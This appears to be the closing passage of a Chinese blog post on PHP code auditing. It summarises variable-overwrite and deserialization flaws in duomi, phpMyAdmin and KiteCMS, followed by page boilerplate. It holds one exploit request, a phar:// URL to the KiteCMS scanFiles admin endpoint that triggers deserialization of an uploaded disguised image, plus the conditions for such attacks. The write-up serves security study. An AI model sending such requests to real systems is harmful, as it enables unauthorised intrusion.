+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250615211224682-17499931470401.png" srcset="/img/loading.gif" lazyload></p>
+<p>4 .直接访问url,触发scanFilesForTree方法</p>
+<p>&#x2F;admin&#x2F;admin&#x2F;scanFiles?dir&#x3D;phar:&#x2F;&#x2F;.&#x2F;upload/20231030/306437f8a938426c66e97468b219ff61.png</p>
+<h4 id="phar反序列化使用条件"><a href="#phar反序列化使用条件" class="headerlink" title="phar反序列化使用条件"></a>phar反序列化使用条件</h4><p>1.phar文件要能够上传到服务器</p>
+<p>2 .有特殊文件操作函数如：file_exists() , fopen()，file_get_contents(),file()  等魔术方法作为跳板，该函数参数可控，没有过滤  : , &#x2F;，phar等特殊字符</p>
+<p>总结：</p>
+<blockquote>
+<p>duomi：变量覆盖达到直接访问后台的目的。它有条件覆盖session（session_start()+变量覆盖）且保持会话状态的逻辑是检验session</p>
+<p>phpmyadmin： 反序列化unserialize()接收的参数可控可以直接传入，注入点为表单中的参数configuration</p>
+<p>kitecms：   phar伪协议触发反序列化。文件上传phar文件，触发特殊文件操作函数+ phar协议读取上传的文件</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">php代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php变量覆盖&amp;&amp;反序列化</div>
+      <div>https://bxhhf.github.io/2025/06/12/变量覆盖_反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bxhhf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/08/yuque/yccms/" title="yccms">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">yccms</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/31/MVC/" title="MVC&amp;动态调试未授权">
+                        <span class="hidden-mobile">MVC&amp;动态调试未授权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","appKey":"gbgqDB024hr2I7jmwbO6Mz2a","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxuehua.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!-- 雪花特效 -->
+  <script type="text/javascript" src="\js\snow.js"></script>
+  
+</body>
+</html>
